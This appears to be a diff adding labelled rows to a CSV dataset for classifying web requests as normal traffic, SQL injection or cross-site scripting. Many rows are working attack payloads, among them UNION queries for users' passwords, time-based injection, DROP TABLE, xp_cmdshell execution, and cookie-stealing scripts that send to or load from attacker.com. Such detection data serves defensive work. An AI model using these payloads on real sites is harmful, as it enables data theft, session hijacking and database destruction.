+search?q=cart/add?item_id=554&qty=1,0,NORMAL
+""" OR ""1""=""1",1,SQL_INJECTION
+search?q=account/security/2fa-setup,0,NORMAL
+search?q=4k+oled+television+lg,0,NORMAL
+mechanical keyboard,0,NORMAL
+search?q=python+programming+book,0,NORMAL
+"<object data=""javascript:alert(1)"">",2,XSS
+browse?tag=cotton+t-shirt+blue,0,NORMAL
+cart/checkout?step=billing,0,NORMAL
+"redirect=<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
+images/banner-sale.jpg,0,NORMAL
+api/search?term=checkout?shipping=standard&promo=WELCOME10,0,NORMAL
+item?id=' or 1=1/*,1,SQL_INJECTION
+api/search?term=password123!,0,NORMAL
+"search?q=<a href=""javascript:alert('XSS')"">Click here</a>",2,XSS
+' OR 1=1 --,1,SQL_INJECTION
+"item?id=' UNION ALL SELECT 1, 2, 3, table_name FROM information_schema.tables--",1,SQL_INJECTION
+"1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
+download/specs-datasheet.pdf,0,NORMAL
+login?user=' GROUP BY column_name HAVING 1=1 --,1,SQL_INJECTION
+query=<details open ontoggle=alert(1)>,2,XSS
+login?user=) or ('1'='1,1,SQL_INJECTION
+item?id=%27%20OR%201%3D1%20--,1,SQL_INJECTION
+contact,0,NORMAL
+item/privacy-policy?ref=homepage,0,NORMAL
+gaming monitor,0,NORMAL
+search?q=help/return-policy,0,NORMAL
+order/status?tracking=FEDEX-889922,0,NORMAL
+filter=' GROUP BY column_name HAVING 1=1 --,1,SQL_INJECTION
+order/status?tracking=FEDEX-889922,0,NORMAL
+best headphones under 100,0,NORMAL
+item/contact?ref=homepage,0,NORMAL
+filter?category=product?id=102&category=electronics&sort=desc,0,NORMAL
+' GROUP BY column_name HAVING 1=1 --,1,SQL_INJECTION
+mechanical keyboard,0,NORMAL
+dashboard?view=summary,0,NORMAL
+comment=<body onload=alert('XSS')>,2,XSS
+item?id=1; EXEC xp_cmdshell('dir')--,1,SQL_INJECTION
+wireless mouse,0,NORMAL
+api/v1/users?limit=10&offset=20,0,NORMAL
+<marquee onstart=alert(1)>,2,XSS
+' or 1=1/*,1,SQL_INJECTION
+search?q=terms-and-conditions,0,NORMAL
+api/search?term=newsletter/subscribe?email=user@test.org,0,NORMAL
+"1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
+"search?q=<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
+redirect=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
+"<object data=""javascript:alert(1)"">",2,XSS
+john_doe,0,NORMAL
+<svg onload=alert(1)>,2,XSS
+item?id=1' ORDER BY 1--+,1,SQL_INJECTION
+reviews?rating=5&verified=true,0,NORMAL
+"query=<video><source onerror=""javascript:alert(1)"">",2,XSS
+login?user='; WAITFOR DELAY '0:0:5'--,1,SQL_INJECTION
+blog/post-10-cybersecurity-tips,0,NORMAL
+filter?category=mechanical+keyboard&sort=desc,0,NORMAL
+comment=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
+1; EXEC xp_cmdshell('dir')--,1,SQL_INJECTION
+"filter=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
+item/cart/add?item_id=554&qty=1?ref=homepage,0,NORMAL
+login?user=' OR 1=1 --,1,SQL_INJECTION
+filter='; WAITFOR DELAY '0:0:5'--,1,SQL_INJECTION
+""" OR ""1""=""1",1,SQL_INJECTION
+item?id=' HAVING 1=1 --,1,SQL_INJECTION
+comment=<details open ontoggle=alert(1)>,2,XSS
+filter?category=john_doe&sort=desc,0,NORMAL
+"1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
+"1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
+) or ('1'='1,1,SQL_INJECTION
+api/search?term=newsletter/subscribe?email=user@test.org,0,NORMAL
+filter?category=index.html&sort=desc,0,NORMAL
+"query=<video><source onerror=""javascript:alert(1)"">",2,XSS
+api/search?term=contact,0,NORMAL
+browse?tag=cart/add?item_id=554&qty=1,0,NORMAL
+password123!,0,NORMAL
+api/search?term=shoes+for+running,0,NORMAL
+item/gaming+monitor?ref=homepage,0,NORMAL
+filter?category=assets/js/bundle.min.js&sort=desc,0,NORMAL
+"<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
+filter?category=alice.smith@example.com&sort=desc,0,NORMAL
+view_order?order_id=983214,0,NORMAL
+query=john_doe&page=1,0,NORMAL
+<img src=x onerror=alert('XSS')>,2,XSS
+' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
+"1' UNION SELECT null, null, null--",1,SQL_INJECTION
+"<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
+search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
+account/security/2fa-setup,0,NORMAL
+mechanical keyboard,0,NORMAL
+query=admin_user_2024&page=1,0,NORMAL
+query=<select autofocus onfocus=alert(1)>,2,XSS
+best headphones under 100,0,NORMAL
+%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E,2,XSS
+"query=<iframe src=""javascript:alert(`XSS`)""></iframe>",2,XSS
+api/search?term=best+headphones+under+100,0,NORMAL
+<select autofocus onfocus=alert(1)>,2,XSS
+item/john_doe?ref=homepage,0,NORMAL
+api/search?term=dashboard?view=summary,0,NORMAL
+filter=' or 1=1/*,1,SQL_INJECTION
+search?q=images/banner-sale.jpg,0,NORMAL
+terms-and-conditions,0,NORMAL
+"query=<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
+filter?category=product?id=102&category=electronics&sort=desc,0,NORMAL
+item/shoes+for+running?ref=homepage,0,NORMAL
+browse?tag=apple+macbook+pro+m2,0,NORMAL
+%27%20OR%201%3D1%20--,1,SQL_INJECTION
+redirect='><script>alert('PWNED')</script>,2,XSS
+search?q=1; DROP TABLE users--,1,SQL_INJECTION
+cart/checkout?step=billing,0,NORMAL
+login?user=' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
+filter=' or 1=1/*,1,SQL_INJECTION
+item/terms-and-conditions?ref=homepage,0,NORMAL
+api/search?term=cotton+t-shirt+blue,0,NORMAL
+api/search?term=search?q=4k+oled+television+lg,0,NORMAL
+"item?id=test' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",1,SQL_INJECTION
+query=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
+item?id=' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
+' OR '1'='1,1,SQL_INJECTION
+settings?theme=dark&lang=en,0,NORMAL
+api/search?term=search?q=spring+sale+discount,0,NORMAL
+item?id=1' AND 1=(SELECT COUNT(*) FROM tabname); --,1,SQL_INJECTION
+search?q=images/banner-sale.jpg,0,NORMAL
+filter=1' ORDER BY 2--+,1,SQL_INJECTION
+images/banner-sale.jpg,0,NORMAL
+filter=1; EXEC xp_cmdshell('dir')--,1,SQL_INJECTION
+filter?category=reviews?rating=5&verified=true&sort=desc,0,NORMAL
+<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>,2,XSS
+query=<marquee onstart=alert(1)>,2,XSS
+download/specs-datasheet.pdf,0,NORMAL
+search?q=dashboard?view=summary,0,NORMAL
+apple macbook pro m2,0,NORMAL
+search?q=1; DROP TABLE users--,1,SQL_INJECTION
+1' ORDER BY 1--+,1,SQL_INJECTION
+' HAVING 1=1 --,1,SQL_INJECTION
+mechanical keyboard,0,NORMAL
+browse?tag=usb+c+cable+2m,0,NORMAL
+' OR '1'='1,1,SQL_INJECTION
+<svg onload=alert(1)>,2,XSS
+1' ORDER BY 3--+,1,SQL_INJECTION
+item?id=1' ORDER BY 3--+,1,SQL_INJECTION
+"item?id=' UNION ALL SELECT 1, 2, 3, table_name FROM information_schema.tables--",1,SQL_INJECTION
+search?q=<script>alert(1)</script>,2,XSS
+filter?category=products/audio/bluetooth-speakers&sort=desc,0,NORMAL
+blog/post-10-cybersecurity-tips,0,NORMAL
+query=admin_user_2024&page=1,0,NORMAL
+search?q=cotton+t-shirt+blue,0,NORMAL
+settings?theme=dark&lang=en,0,NORMAL
+browse?tag=search?q=mechanical+pencil+0.5mm,0,NORMAL
+filter?category=cart/add?item_id=554&qty=1&sort=desc,0,NORMAL
+item/assets/css/main.css?ref=homepage,0,NORMAL
+search?q=contact,0,NORMAL
+redirect=<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>,2,XSS
+cart/add?item_id=554&qty=1,0,NORMAL
+search?q=shoes+for+running,0,NORMAL
+"<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
+query=cart/checkout?step=billing&page=1,0,NORMAL
+search?q=4k+oled+television+lg,0,NORMAL
+assets/js/bundle.min.js,0,NORMAL
+api/search?term=settings?theme=dark&lang=en,0,NORMAL
+"redirect=""><script>alert(document.domain)</script>",2,XSS
+filter=' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,SQL_INJECTION
+search?q=<svg/onload=alert('XSS')>,2,XSS
+item/mechanical+keyboard?ref=homepage,0,NORMAL
+item/view_order?order_id=983214?ref=homepage,0,NORMAL
+cotton t-shirt blue,0,NORMAL
+search?q=4k+oled+television+lg,0,NORMAL
+api/search?term=alice.smith@example.com,0,NORMAL
+apple macbook pro m2,0,NORMAL
+filter=SELECT * FROM members WHERE username = 'admin' OR '1'='1',1,SQL_INJECTION
+1' ORDER BY 3--+,1,SQL_INJECTION
+"redirect=<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
+<img src=x onerror=alert('XSS')>,2,XSS
+"<object data=""javascript:alert(1)"">",2,XSS
+filter?category=best+headphones+under+100&sort=desc,0,NORMAL
+filter?category=api/v1/users?limit=10&offset=20&sort=desc,0,NORMAL
+search?q=settings?theme=dark&lang=en,0,NORMAL
+search?q=blog/post-10-cybersecurity-tips,0,NORMAL
+mechanical keyboard,0,NORMAL
+dashboard?view=summary,0,NORMAL
+search?q=<details open ontoggle=alert(1)>,2,XSS
+browse?tag=search?q=ergonomic+chair+mesh,0,NORMAL
+%27%20UNION%20SELECT%20null%2Cusername%2Cpassword%20FROM%20users--,1,SQL_INJECTION
+<svg/onload=alert('XSS')>,2,XSS
+catalog?page=2&sort=price_asc,0,NORMAL
+admin' --,1,SQL_INJECTION
+"redirect=<video><source onerror=""javascript:alert(1)"">",2,XSS
+search?q=<script>alert('XSS')</script>,2,XSS
+"query=<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
+' GROUP BY column_name HAVING 1=1 --,1,SQL_INJECTION
+admin' --,1,SQL_INJECTION
+item/usb+c+cable+2m?ref=homepage,0,NORMAL
+"comment=<object data=""javascript:alert(1)"">",2,XSS
+filter?category=account/security/2fa-setup&sort=desc,0,NORMAL
+"search?q=' UNION ALL SELECT 1, 2, 3, table_name FROM information_schema.tables--",1,SQL_INJECTION
+api/search?term=settings?theme=dark&lang=en,0,NORMAL
+settings?theme=dark&lang=en,0,NORMAL
+order/status?tracking=FEDEX-889922,0,NORMAL
+' OR 'a'='a,1,SQL_INJECTION
+<img src=x onerror=alert('XSS')>,2,XSS
+search?q=cart/checkout?step=billing,0,NORMAL
+apple macbook pro m2,0,NORMAL
+' OR '1'='1,1,SQL_INJECTION
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
+"comment=<object data=""javascript:alert(1)"">",2,XSS
+download/specs-datasheet.pdf,0,NORMAL
+"filter=test' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",1,SQL_INJECTION
+item/products/audio/bluetooth-speakers?ref=homepage,0,NORMAL
+search?q=search?q=spring+sale+discount,0,NORMAL
+cart/checkout?step=billing,0,NORMAL
+"search?q=<video><source onerror=""javascript:alert(1)"">",2,XSS
+""" OR ""1""=""1",1,SQL_INJECTION
+1' AND SLEEP(10)--,1,SQL_INJECTION
+search?q=best+headphones+under+100,0,NORMAL
+admin' --,1,SQL_INJECTION
+' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
+<isindex type=image src=1 onerror=alert(1)>,2,XSS
+browse?tag=mechanical+keyboard,0,NORMAL
+item?id=' HAVING 1=1 --,1,SQL_INJECTION
+"query=<video><source onerror=""javascript:alert(1)"">",2,XSS
+%27%20UNION%20SELECT%20null%2Cusername%2Cpassword%20FROM%20users--,1,SQL_INJECTION
+"<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
+assets/js/bundle.min.js,0,NORMAL
+"<script src=""http://attacker.com/malicious.js""></script>",2,XSS
+filter?category=cotton+t-shirt+blue&sort=desc,0,NORMAL
+dashboard?view=summary,0,NORMAL
+browse?tag=settings?theme=dark&lang=en,0,NORMAL
+query=search?q=spring+sale+discount&page=1,0,NORMAL
+mechanical keyboard,0,NORMAL
+"filter=' UNION ALL SELECT 1, 2, 3, table_name FROM information_schema.tables--",1,SQL_INJECTION
+redirect=<svg/onload=alert('XSS')>,2,XSS
+api/search?term=assets/js/bundle.min.js,0,NORMAL
+filter=%27%20OR%201%3D1%20--,1,SQL_INJECTION
+search?q=4k+oled+television+lg,0,NORMAL
+query=help/return-policy&page=1,0,NORMAL
+laptop,0,NORMAL
+item/api/v1/users?limit=10&offset=20?ref=homepage,0,NORMAL
+%27%20OR%201%3D1%20--,1,SQL_INJECTION
+contact,0,NORMAL
+item?id=1' AND 1=(SELECT COUNT(*) FROM tabname); --,1,SQL_INJECTION
+search?q=api/v1/users?limit=10&offset=20,0,NORMAL
+"<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
+mechanical keyboard,0,NORMAL
+<svg onload=alert(1)>,2,XSS
+1' ORDER BY 2--+,1,SQL_INJECTION
+%27%20UNION%20SELECT%20null%2Cusername%2Cpassword%20FROM%20users--,1,SQL_INJECTION
+reviews?rating=5&verified=true,0,NORMAL
+' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
+admin' #,1,SQL_INJECTION
+' or 1=1#,1,SQL_INJECTION
+search?q=' OR 1=1 --,1,SQL_INJECTION
+redirect=<body onload=alert('XSS')>,2,XSS
+"item?id="" OR ""1""=""1",1,SQL_INJECTION
+"query=<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
+account/security/2fa-setup,0,NORMAL
+filter=SELECT * FROM members WHERE username = 'admin' OR '1'='1',1,SQL_INJECTION
+redirect=<select autofocus onfocus=alert(1)>,2,XSS
+browse?tag=dashboard?view=summary,0,NORMAL
+product?id=102&category=electronics,0,NORMAL
+comment=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
+password123!,0,NORMAL
+assets/css/main.css,0,NORMAL
+api/v1/users?limit=10&offset=20,0,NORMAL
+1' ORDER BY 1--+,1,SQL_INJECTION
+query=gaming+monitor&page=1,0,NORMAL
+"<script src=""http://attacker.com/malicious.js""></script>",2,XSS
+"<video><source onerror=""javascript:alert(1)"">",2,XSS
+1; EXEC xp_cmdshell('dir')--,1,SQL_INJECTION
+query=product?id=102&category=electronics&page=1,0,NORMAL
+' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
+api/search?term=john_doe,0,NORMAL
+filter=' OR 'a'='a,1,SQL_INJECTION
+query=<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>,2,XSS
+' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
+"query=<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
+search?q=product?id=102&category=electronics,0,NORMAL
+profile/edit?name=Johnathan,0,NORMAL
+cotton t-shirt blue,0,NORMAL
+search?q=ergonomic+chair+mesh,0,NORMAL
+index.html,0,NORMAL
+query=privacy-policy&page=1,0,NORMAL
+"filter=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
+dashboard?view=summary,0,NORMAL
+browse?tag=product?id=102&category=electronics,0,NORMAL
+item/search?q=spring+sale+discount?ref=homepage,0,NORMAL
+' OR 'a'='a,1,SQL_INJECTION
+browse?tag=help/return-policy,0,NORMAL
+query=<svg/onload=alert('XSS')>,2,XSS
+filter=' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
+"query=<object data=""javascript:alert(1)"">",2,XSS
+filter?category=cotton+t-shirt+blue&sort=desc,0,NORMAL
+dashboard?view=summary,0,NORMAL
+"item?id=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
+query='><script>alert('PWNED')</script>,2,XSS
+search?q='><script>alert('PWNED')</script>,2,XSS
+"comment=<video><source onerror=""javascript:alert(1)"">",2,XSS
+index.html,0,NORMAL
+browse?tag=search?q=mechanical+pencil+0.5mm,0,NORMAL
+"' UNION SELECT username, password FROM users--",1,SQL_INJECTION
+search?q=<marquee onstart=alert(1)>,2,XSS
+search?q=assets/js/bundle.min.js,0,NORMAL
+api/search?term=python+programming+book,0,NORMAL
+admin' #,1,SQL_INJECTION
+browse?tag=blog/post-10-cybersecurity-tips,0,NORMAL
+item?id=1; DROP TABLE users--,1,SQL_INJECTION
+'><script>alert('PWNED')</script>,2,XSS
+item?id=1; EXEC xp_cmdshell('dir')--,1,SQL_INJECTION
+filter=') or ('1'='1'--,1,SQL_INJECTION
+<script>alert(1)</script>,2,XSS
+api/search?term=mechanical+keyboard,0,NORMAL
+filter?category=download/specs-datasheet.pdf&sort=desc,0,NORMAL
+<svg/onload=alert('XSS')>,2,XSS
+search?q=index.html,0,NORMAL
+1' AND SLEEP(10)--,1,SQL_INJECTION
+newsletter/subscribe?email=user@test.org,0,NORMAL
+' HAVING 1=1 --,1,SQL_INJECTION
+redirect=<marquee onstart=alert(1)>,2,XSS
+filter=') or ('1'='1'--,1,SQL_INJECTION
+shoes for running,0,NORMAL
+laptop,0,NORMAL
+<input autofocus onfocus=alert(1)>,2,XSS
+browse?tag=product?id=102&category=electronics,0,NORMAL
+filter?category=cotton+t-shirt+blue&sort=desc,0,NORMAL
+search?q=reviews?rating=5&verified=true,0,NORMAL
+query=catalog?page=2&sort=price_asc&page=1,0,NORMAL
+"1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
+"<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
+browse?tag=reviews?rating=5&verified=true,0,NORMAL
+browse?tag=cart/checkout?step=billing,0,NORMAL
+profile/edit?name=Johnathan,0,NORMAL
+filter?category=reviews?rating=5&verified=true&sort=desc,0,NORMAL
+filter?category=assets/css/main.css&sort=desc,0,NORMAL
+query=dashboard?view=summary&page=1,0,NORMAL
+%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E,2,XSS
+search?q=spring+sale+discount,0,NORMAL
+%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E,2,XSS
+"<a href=""javascript:alert('XSS')"">Click here</a>",2,XSS
+search?q=search?q=mechanical+pencil+0.5mm,0,NORMAL
+query=shoes+for+running&page=1,0,NORMAL
+api/search?term=blog/post-10-cybersecurity-tips,0,NORMAL
+item/home?ref=homepage,0,NORMAL
+search?q=%27%20UNION%20SELECT%20null%2Cusername%2Cpassword%20FROM%20users--,1,SQL_INJECTION
+redirect=<svg onload=alert(1)>,2,XSS
+python programming book,0,NORMAL
+browse?tag=products/audio/bluetooth-speakers,0,NORMAL
+"redirect=<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
+comment=<script>alert(1)</script>,2,XSS
+' or 1=1/*,1,SQL_INJECTION
+contact,0,NORMAL
+query='><script>alert('PWNED')</script>,2,XSS
+<svg/onload=alert('XSS')>,2,XSS
+<svg/onload=alert('XSS')>,2,XSS
+'; WAITFOR DELAY '0:0:5'--,1,SQL_INJECTION
+"<iframe src=""javascript:alert(`XSS`)""></iframe>",2,XSS
+login?user=admin'/*,1,SQL_INJECTION
+"<video><source onerror=""javascript:alert(1)"">",2,XSS
+"filter=test' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",1,SQL_INJECTION
+<body onload=alert('XSS')>,2,XSS
+<marquee onstart=alert(1)>,2,XSS
+help/return-policy,0,NORMAL
+"login?user=' UNION ALL SELECT 1, 2, 3, table_name FROM information_schema.tables--",1,SQL_INJECTION
+admin'/*,1,SQL_INJECTION
+browse?tag=cotton+t-shirt+blue,0,NORMAL
+filter?category=search?q=ergonomic+chair+mesh&sort=desc,0,NORMAL
+api/search?term=wireless+mouse,0,NORMAL
+' or 1=1/*,1,SQL_INJECTION
+account/security/2fa-setup,0,NORMAL
+search?q=ergonomic+chair+mesh,0,NORMAL
+api/search?term=about-us,0,NORMAL
+faq/shipping-times,0,NORMAL
+redirect='><script>alert('PWNED')</script>,2,XSS
+comment=<select autofocus onfocus=alert(1)>,2,XSS
+browse?tag=assets/js/bundle.min.js,0,NORMAL
+login?user=1' ORDER BY 3--+,1,SQL_INJECTION
+redirect=<select autofocus onfocus=alert(1)>,2,XSS
+best headphones under 100,0,NORMAL
+search?q=' or 1=1/*,1,SQL_INJECTION
+"comment=javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert(1)//'>",2,XSS
+wireless mouse,0,NORMAL
+login?user=1' AND SLEEP(10)--,1,SQL_INJECTION
+filter?category=faq/shipping-times&sort=desc,0,NORMAL
+search?q=') or ('1'='1'--,1,SQL_INJECTION
+SELECT * FROM members WHERE username = 'admin' OR '1'='1',1,SQL_INJECTION
+about-us,0,NORMAL
+api/search?term=john_doe,0,NORMAL
+' or 1=1#,1,SQL_INJECTION
+query=<svg/onload=alert('XSS')>,2,XSS
+<script>alert(1)</script>,2,XSS
+<marquee onstart=alert(1)>,2,XSS
+search?q=profile/edit?name=Johnathan,0,NORMAL
+api/search?term=admin_user_2024,0,NORMAL
+""" OR ""1""=""1",1,SQL_INJECTION
+"filter=' UNION ALL SELECT 1, 2, 3, table_name FROM information_schema.tables--",1,SQL_INJECTION
+' or 1=1#,1,SQL_INJECTION
+wireless mouse,0,NORMAL
+login?user=' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,SQL_INJECTION
+home,0,NORMAL
+comment=<input autofocus onfocus=alert(1)>,2,XSS
+profile/edit?name=Johnathan,0,NORMAL
+filter=SELECT * FROM members WHERE username = 'admin' OR '1'='1',1,SQL_INJECTION
+home,0,NORMAL
+) or ('1'='1,1,SQL_INJECTION
+reviews?rating=5&verified=true,0,NORMAL
+api/search?term=shoes+for+running,0,NORMAL
+item/product?id=102&category=electronics?ref=homepage,0,NORMAL
+item/gaming+monitor?ref=homepage,0,NORMAL
+%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E,2,XSS
+) or ('1'='1,1,SQL_INJECTION
+redirect=<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>,2,XSS
+search?q=1' ORDER BY 1--+,1,SQL_INJECTION
+"test' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",1,SQL_INJECTION
+<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>,2,XSS
+1' ORDER BY 2--+,1,SQL_INJECTION
+1; EXEC xp_cmdshell('dir')--,1,SQL_INJECTION
+laptop,0,NORMAL
+<script>alert('XSS')</script>,2,XSS
+login?user=1' ORDER BY 3--+,1,SQL_INJECTION
+"""><script>alert(document.domain)</script>",2,XSS
+redirect=%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E,2,XSS
+item/john_doe?ref=homepage,0,NORMAL
+download/specs-datasheet.pdf,0,NORMAL
+search?q=' OR '1'='1,1,SQL_INJECTION
+browse?tag=reviews?rating=5&verified=true,0,NORMAL
+browse?tag=search?q=ergonomic+chair+mesh,0,NORMAL
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
+1; EXEC xp_cmdshell('dir')--,1,SQL_INJECTION
+filter='; WAITFOR DELAY '0:0:5'--,1,SQL_INJECTION
+filter?category=view_order?order_id=983214&sort=desc,0,NORMAL
+redirect=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
+"1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
+search?q=' or 1=1#,1,SQL_INJECTION
+search?q=admin_user_2024,0,NORMAL
+item/terms-and-conditions?ref=homepage,0,NORMAL
+filter?category=products/audio/bluetooth-speakers&sort=desc,0,NORMAL
+filter=' GROUP BY column_name HAVING 1=1 --,1,SQL_INJECTION
+faq/shipping-times,0,NORMAL
+"1' UNION SELECT null, null, null--",1,SQL_INJECTION
+dashboard?view=summary,0,NORMAL
+"' UNION ALL SELECT 1, 2, 3, table_name FROM information_schema.tables--",1,SQL_INJECTION
+alice.smith@example.com,0,NORMAL
+search?q=catalog?page=2&sort=price_asc,0,NORMAL
+search?q=checkout?shipping=standard&promo=WELCOME10,0,NORMAL
+redirect='><script>alert('PWNED')</script>,2,XSS
+reviews?rating=5&verified=true,0,NORMAL
+search?q=product?id=102&category=electronics,0,NORMAL
+browse?tag=laptop,0,NORMAL
+browse?tag=wireless+mouse,0,NORMAL
+query=<marquee onstart=alert(1)>,2,XSS
+"login?user="" OR ""1""=""1",1,SQL_INJECTION
+comment='><script>alert('PWNED')</script>,2,XSS
+"search?q=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
+item/account/security/2fa-setup?ref=homepage,0,NORMAL
+"<script src=""http://attacker.com/malicious.js""></script>",2,XSS
+filter=admin' #,1,SQL_INJECTION
+order/status?tracking=FEDEX-889922,0,NORMAL
+search?q=4k+oled+television+lg,0,NORMAL
+query=profile/edit?name=Johnathan&page=1,0,NORMAL
+"<iframe src=""javascript:alert(`XSS`)""></iframe>",2,XSS
+mechanical keyboard,0,NORMAL
+filter?category=assets/js/bundle.min.js&sort=desc,0,NORMAL
+search?q=1; DROP TABLE users--,1,SQL_INJECTION
+apple macbook pro m2,0,NORMAL
+redirect=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
+"<object data=""javascript:alert(1)"">",2,XSS
+password123!,0,NORMAL
+newsletter/subscribe?email=user@test.org,0,NORMAL
+"<iframe src=""javascript:alert(`XSS`)""></iframe>",2,XSS
+login?user=1' ORDER BY 1--+,1,SQL_INJECTION
+<script>alert(1)</script>,2,XSS
+index.html,0,NORMAL
+<select autofocus onfocus=alert(1)>,2,XSS
+filter?category=contact&sort=desc,0,NORMAL
+<marquee onstart=alert(1)>,2,XSS
+'><script>alert('PWNED')</script>,2,XSS
+query=<body onload=alert('XSS')>,2,XSS
+settings?theme=dark&lang=en,0,NORMAL
+filter=' OR '1'='1,1,SQL_INJECTION
+help/return-policy,0,NORMAL
+account/security/2fa-setup,0,NORMAL
+' OR '1'='1,1,SQL_INJECTION
+browse?tag=account/security/2fa-setup,0,NORMAL
+1' ORDER BY 3--+,1,SQL_INJECTION
+1' ORDER BY 1--+,1,SQL_INJECTION
+""" OR ""1""=""1",1,SQL_INJECTION
+search?q=gaming+monitor,0,NORMAL
+<svg onload=alert(1)>,2,XSS
+"query=javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert(1)//'>",2,XSS
+login?user=admin' --,1,SQL_INJECTION
+api/search?term=index.html,0,NORMAL
+gaming monitor,0,NORMAL
+filter?category=help/return-policy&sort=desc,0,NORMAL
+filter?category=index.html&sort=desc,0,NORMAL
+help/return-policy,0,NORMAL
+item?id=admin' #,1,SQL_INJECTION
+comment=<img src=x onerror=alert('XSS')>,2,XSS
+comment=<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>,2,XSS
+browse?tag=cart/checkout?step=billing,0,NORMAL
+browse?tag=password123!,0,NORMAL
+wireless mouse,0,NORMAL
+filter=1' ORDER BY 3--+,1,SQL_INJECTION
+about-us,0,NORMAL
+' OR '1'='1,1,SQL_INJECTION
+admin_user_2024,0,NORMAL
+"query=<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
+item/john_doe?ref=homepage,0,NORMAL
+search?q=admin' #,1,SQL_INJECTION
+"redirect=""><script>alert(document.domain)</script>",2,XSS
+') or ('1'='1'--,1,SQL_INJECTION
+filter?category=product?id=102&category=electronics&sort=desc,0,NORMAL
+search?q=4k+oled+television+lg,0,NORMAL
+item?id=%27%20UNION%20SELECT%20null%2Cusername%2Cpassword%20FROM%20users--,1,SQL_INJECTION
+"item?id="" OR ""1""=""1",1,SQL_INJECTION
+'><script>alert('PWNED')</script>,2,XSS
